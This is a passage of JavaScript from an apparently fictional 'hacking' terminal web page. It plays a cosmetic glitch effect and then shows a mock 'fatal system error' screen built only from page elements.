                const inputLine = document.getElementById('terminal-input').closest('.terminal-line');
                if (inputLine) {
                    inputLine.style.display = 'block';
                    this.resetInputState();
                }
            }, 2000);
        }
    }

    startSystemDestruction() {
        // Add destruction overlay to body
        const destructionOverlay = document.createElement('div');
        destructionOverlay.className = 'system-destruction-overlay';
        document.body.appendChild(destructionOverlay);
        
        // Start glitch effects
        document.body.classList.add('system-glitch');
        
        // Progressive destruction sequence
        setTimeout(() => {
            this.showFatalError();
        }, 8000);
    }

    showFatalError() {
        // Create fatal error screen
        const errorScreen = document.createElement('div');
        errorScreen.className = 'fatal-error-screen';
        errorScreen.innerHTML = `
            <div class="error-content">
                <div class="error-header">FATAL SYSTEM ERROR</div>
                <div class="error-code">ERROR CODE: 0x00000079</div>
                <div class="error-message">
                    SYSTEM REGISTRY CORRUPTED<br>
                    BOOT SECTOR DESTROYED<br>
                    CASCADE FAILURE DETECTED<br><br>
                    THE SYSTEM HAS BEEN COMPROMISED<br>
                    UNABLE TO RECOVER
                </div>
                <div class="error-footer">Press CTRL+ALT+DEL to restart</div>
            </div>
        `;
        
        document.body.appendChild(errorScreen);
        
        // Stop all other effects after error appears
        setTimeout(() => {
            document.body.classList.remove('system-glitch');
        }, 1000);
    }
}

document.addEventListener('DOMContentLoaded', () => {
    new NightfallHack();
});